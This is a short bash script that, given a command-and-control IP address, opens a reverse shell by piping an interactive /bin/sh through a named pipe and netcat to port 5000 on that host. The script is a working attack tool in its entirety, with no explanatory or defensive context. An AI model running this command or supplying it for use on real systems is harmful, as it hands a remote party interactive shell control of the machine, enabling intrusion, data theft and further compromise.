#!/bin/bash
C2_PORT=5000
if [[ $# < 1 ]];then
    echo "usage: $0 <c2 ip>"
    exit
fi
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $1 ${C2_PORT} > /tmp/f
